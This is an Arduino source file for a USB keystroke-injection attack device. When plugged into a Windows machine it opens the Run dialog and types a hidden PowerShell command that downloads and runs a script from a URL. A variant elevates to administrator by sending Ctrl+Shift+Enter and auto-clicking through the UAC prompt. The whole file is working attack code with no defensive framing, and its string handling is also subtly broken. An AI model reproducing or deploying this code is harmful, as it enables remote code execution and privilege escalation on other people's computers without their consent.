void winR(){
    // opens the Run command box
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');

    Keyboard.releaseAll();
}

void writeCMD(char *URL){
    const char* cmd = (String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str();
    Keyboard.print(cmd);
}

void runRemote(char *URL){
  // downloads and runs a powershell script from a url
  winR();
  delay(300); // wait for Run command prompt to appear
  writeCMD(URL);

  for (int i=0; i < 3; i++)
  {
    // press enter to run the command
    // repeats in case the device or OS wasn't ready yet to receive keyboard input
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
  }
};

void runRemoteAdmin(char *URL){
  // same as runRemote, but with admin privileges
  // note: this only works if user logged-in is admin and admin prompts don't require a password
  winR();
  delay(300); // wait for Run command prompt to appear
  writeCMD(URL);

  // run as Admin
  Keyboard.press(129); // ctrl
  Keyboard.press(129); // shift
  Keyboard.press(KEY_RETURN); // enter
  Keyboard.releaseAll();
  delay(100);

  for (int i=0; i < 4; i++)
  {
    // select YES on UAC prompt
    // repeats in case UAC prompt wasn't ready yet to receive keyboard input
    Keyboard.press(KEY_LEFT_ARROW);
    delay(20);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);
  }
};
